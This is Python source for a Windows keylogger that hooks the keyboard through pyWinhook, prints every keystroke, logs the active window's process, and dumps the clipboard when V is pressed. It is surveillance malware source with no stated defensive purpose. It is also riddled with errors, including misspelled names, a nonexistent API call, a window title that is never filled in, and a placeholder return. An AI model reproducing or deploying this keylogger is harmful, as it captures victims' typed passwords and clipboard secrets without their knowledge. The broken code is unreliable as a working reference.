from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pyWinhook as pyhook
import pythoncom
import sys
import time
import win32clipboard

TIMEOUT = 10

class Keylogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(selfself):
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id= f'{pid.value}'

        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetWindowBaseNameA(h_process, None, byref(executable), 512)
        window_title = create_buffer_string(512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeErrora as err:
            print(f'{err}): window name is known =')

        print('\n', process_id, executable.value.decode(), self.current_window)
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CoseHandle(h_process)

    def KeyEvent(self, event):
        if event.WindowName != self.current_window:
            self.get_current_process()
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end = "")
        else:
            if event.Key == "V":
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE]__{value}')
            else:
                print(f'{event.Key}')
        return ""


def run():
#    save_stdout = sys.stdout
#    sys.stdout = StringIO()

    kl = Keylogger()
    hm = pyhook.HookManager()
    hm.keyDown = kl.KeyEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()
#    log = sys.stdout.getvalue()
#    sys.stdout = save_stdout
    log = "do later"
    return log